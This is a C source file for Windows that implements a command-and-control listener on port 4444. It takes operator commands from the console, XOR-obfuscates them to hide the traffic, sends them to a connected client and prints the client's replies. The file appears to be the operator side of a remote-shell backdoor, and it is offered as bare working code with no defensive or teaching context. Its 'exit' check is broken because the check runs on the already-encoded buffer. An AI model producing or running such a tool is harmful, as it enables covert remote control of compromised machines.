#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>

#pragma comment(lib, "ws2_32.lib")

#define PORT 4444
#define BUFFER_SIZE 4096
#define XOR_KEY 0xAA // XOR encryption key

// XOR encryption/decryption
void xor_encrypt_decrypt(char *data, int len, char key) {
    for (int i = 0; i < len; i++) {
        data[i] ^= key;
    }
}

void start_server() {
    WSADATA wsa;
    SOCKET server_socket, client_socket;
    struct sockaddr_in server_addr, client_addr;
    int client_addr_len = sizeof(client_addr);
    char buffer[BUFFER_SIZE];

    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        printf("Failed to initialize Winsock.\n");
        return;
    }

    server_socket = socket(AF_INET, SOCK_STREAM, 0);
    if (server_socket == INVALID_SOCKET) {
        printf("Socket creation failed.\n");
        WSACleanup();
        return;
    }

    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = INADDR_ANY;
    server_addr.sin_port = htons(PORT);

    if (bind(server_socket, (struct sockaddr *)&server_addr, sizeof(server_addr)) == SOCKET_ERROR) {
        printf("Bind failed.\n");
        closesocket(server_socket);
        WSACleanup();
        return;
    }

    if (listen(server_socket, 1) == SOCKET_ERROR) {
        printf("Listen failed.\n");
        closesocket(server_socket);
        WSACleanup();
        return;
    }

    printf("Server listening on port %d...\n", PORT);
    client_socket = accept(server_socket, (struct sockaddr *)&client_addr, &client_addr_len);
    if (client_socket == INVALID_SOCKET) {
        printf("Client connection failed.\n");
        closesocket(server_socket);
        WSACleanup();
        return;
    }

    printf("Client connected.\n");

    while (1) {
        printf("Enter command (or 'exit' to quit): ");
        fgets(buffer, sizeof(buffer), stdin);
        buffer[strcspn(buffer, "\n")] = '\0'; // Remove newline

        int command_len = strlen(buffer);
        xor_encrypt_decrypt(buffer, command_len, XOR_KEY);
        send(client_socket, buffer, command_len, 0);

        if (strcmp(buffer, "exit") == 0) {
            printf("Exiting...\n");
            break;
        }

        memset(buffer, 0, sizeof(buffer));
        int bytes_received = recv(client_socket, buffer, sizeof(buffer) - 1, 0);
        if (bytes_received > 0) {
            buffer[bytes_received] = '\0'; // Null-terminate
            xor_encrypt_decrypt(buffer, bytes_received, XOR_KEY);
            printf("Client response: %s\n", buffer);
        }
    }

    closesocket(client_socket);
    closesocket(server_socket);
    WSACleanup();
}

int main() {
    start_server();
    return 0;
}
